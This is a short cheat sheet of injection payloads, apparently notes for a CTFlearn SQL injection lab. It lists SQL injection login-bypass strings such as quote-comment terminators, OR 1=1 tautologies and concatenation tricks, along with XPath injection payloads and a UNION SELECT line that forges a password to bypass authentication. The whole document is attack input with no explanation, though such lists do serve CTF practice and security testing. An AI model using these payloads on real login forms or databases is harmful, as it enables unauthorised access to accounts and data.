### Helpful links:
https://ctflearn.com/lab/sql-injection-part-1




### COMMANDS:

```sql
admin'--
admin' /*
admin';
ad'||'min'; // Concatenation operator : Concatenates and then terminates
```
```sql
" or 1=1 -- 
" OR 1=1 --
```

```sql
' or 1 or '
' or 1=1 --
' OR 1=1 --
' or '1' = '1
' OR "tr"||"ue" --
' OR 2^3 --
admin admin
user user
```

## Xpath injection
```python
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

## Bypass Login
```py
SELECT password FROM admins WHERE username='admin' UNION SELECT '123' AS password#
' UNION SELECT '123' AS password#
```
